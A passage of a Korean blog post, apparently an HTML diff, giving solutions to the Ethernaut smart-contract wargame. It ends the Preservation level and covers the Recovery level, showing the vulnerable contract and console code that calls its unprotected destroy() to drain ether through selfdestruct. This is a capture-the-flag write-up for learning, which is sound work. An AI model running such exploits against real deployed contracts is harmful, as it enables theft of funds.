+<span style="color:#e6db74">&#39;0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F&#39;</span>
+
+<span style="color:#75715e">// LibraryContractHook Deploy
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// PreservationExploit Deploy &amp; call exploit()
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">timeZone1Library</span>();
+<span style="color:#e6db74">&#39;0x67FeC8C9Ae98D7cfeeD4ef05F3E7c3A432AB59Ed&#39;</span>
+<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">timeZone2Library</span>();
+<span style="color:#e6db74">&#39;0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1&#39;</span>
+<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>();
+<span style="color:#e6db74">&#39;0x--------------AttackerEOA---------------&#39;</span>
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><h2 id="-17-recovery"># 17. Recovery<a hidden class="anchor" aria-hidden="true" href="#-17-recovery">#</a></h2>
+<h3 id="summary-16">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-16">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Recovery</span> {
+
+  <span style="color:#75715e">//generate tokens
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateToken</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> _name, <span style="color:#66d9ef">uint256</span> _initialSupply) <span style="color:#66d9ef">public</span> {
+    <span style="color:#66d9ef">new</span> SimpleToken(_name, msg.sender, _initialSupply);
+  
+  }
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">SimpleToken</span> {
+
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#75715e">// public variables
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">string</span> <span style="color:#66d9ef">public</span> name;
+  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> balances;
+
+  <span style="color:#75715e">// constructor
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> _name, <span style="color:#66d9ef">address</span> _creator, <span style="color:#66d9ef">uint256</span> _initialSupply) <span style="color:#66d9ef">public</span> {
+    name <span style="color:#f92672">=</span> _name;
+    balances[_creator] <span style="color:#f92672">=</span> _initialSupply;
+  }
+
+  <span style="color:#75715e">// collect ether in return for tokens
+</span><span style="color:#75715e"></span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+    balances[msg.sender] <span style="color:#f92672">=</span> msg.value.mul(<span style="color:#ae81ff">10</span>);
+  }
+
+  <span style="color:#75715e">// allow transfers of tokens
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _amount) <span style="color:#66d9ef">public</span> { 
+    require(balances[msg.sender] <span style="color:#f92672">&gt;=</span> _amount);
+    balances[msg.sender] <span style="color:#f92672">=</span> balances[msg.sender].sub(_amount);
+    balances[_to] <span style="color:#f92672">=</span> _amount;
+  }
+
+  <span style="color:#75715e">// clean up after ourselves
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _to) <span style="color:#66d9ef">public</span> {
+    selfdestruct(_to);
+  }
+}
+</code></pre></div><p>Recovery 컨트랙트는 SimpleToken 컨트랙트를 이용해 토큰을 생성했고, 해당 SimpleToken 컨트랙트는 <code>receive()</code> 함수를 통해 받은 <code>ether * 10</code>의 토큰을 반환해준다.</p>
+<p>배포자는 SimpleToken에 0.001 ether를 보낸 후, 해당 컨트랙트의 주소를 잃어버린 상황이다.</p>
+<p>이 상황에서 해당 주소로부터 0.001 ether를 찾아와야 한다.</p>
+<h3 id="exploit-16">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-16">#</a></h3>
+<p><code>Get new instance</code>를 통해 배포한 Recovery 컨트랙트를 <a href="https://rinkeby.etherscan.io/">Rinkeby Etherscan</a>에서 검색한다.</p>
+<p>해당 컨트랙트의 <code>Internal Txns</code>의 탭 내용 중 <code>To</code>가 Contract Creation인 Txn을 확인할 수 있다.</p>
+<p>Contract Creation을 클릭하면, Recovery 컨트랙트에 의해 생성된 SimpleToken 컨트랙트를 확인할 수 있다.</p>
+<p>SimpleToken의 <code>Internal Txns</code>를 보면, 해당 컨트랙트로 0.001 ether가 송신된 Txn을 찾을 수 있다. (이 때 <code>From</code>은 Ethernaut의 Level Address)</p>
+<p>이후 아래와 같이, 대상 컨트랙트에 트랜잭션을 전송하여 <code>destroy()</code> 함수를 호출하면 된다.</p>
+<ul>
+<li><code>selfdestruct(_to)</code>를 통해 컨트랙트 destruct 후, 컨트랙트가 가진 잔고는 인자로 전달된 <code>_to</code> 로 전송</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">simpletoken</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[SimpleToken Contract Address]&#34;</span>;
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">simpletoken</span>);
+<span style="color:#e6db74">&#39;0.001&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeFunctionCall</span>({
+    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;destroy&#39;</span>,
+    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;function&#39;</span>,
+    <span style="color:#a6e22e">inputs</span><span style="color:#f92672">:</span> [{
+        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;address&#39;</span>,
+        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;_to&#39;</span>
+    }]
+}, [<span style="color:#a6e22e">player</span>]);
+<span style="color:#e6db74">&#39;0x00f55d9d000000000000000000000000446e7871f0be73127feebdb959d49864043ef525&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span><span style="color:#a6e22e">simpletoken</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">payload</span>})
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">simpletoken</span>);
+<span style="color:#e6db74">&#39;0&#39;</span>
+
+</code></pre></div><hr>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://inhack.github.io/kr/tags/solidity/">solidity</a></li>
+      <li><a href="https://inhack.github.io/kr/tags/smart-contract/">smart contract</a></li>
+      <li><a href="https://inhack.github.io/kr/tags/security/">security</a></li>
+      <li><a href="https://inhack.github.io/kr/tags/wargame/">wargame</a></li>
+      <li><a href="https://inhack.github.io/kr/tags/ctf/">CTF</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>[Solution] Damn Vulnerable DeFi</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on twitter"
+        href="https://twitter.com/intent/tweet/?text=%5bSolution%5d%20Ethernaut&amp;url=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f&amp;hashtags=solidity%2csmartcontract%2csecurity%2cwargame%2cCTF">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f&amp;title=%5bSolution%5d%20Ethernaut&amp;summary=%5bSolution%5d%20Ethernaut&amp;source=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f&title=%5bSolution%5d%20Ethernaut">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on whatsapp"
+        href="https://api.whatsapp.com/send?text=%5bSolution%5d%20Ethernaut%20-%20https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Ethernaut on telegram"
+        href="https://telegram.me/share/url?text=%5bSolution%5d%20Ethernaut&amp;url=https%3a%2f%2finhack.github.io%2fkr%2fposts%2fsolution-ethernaut%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://inhack.github.io/kr/">inhack</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
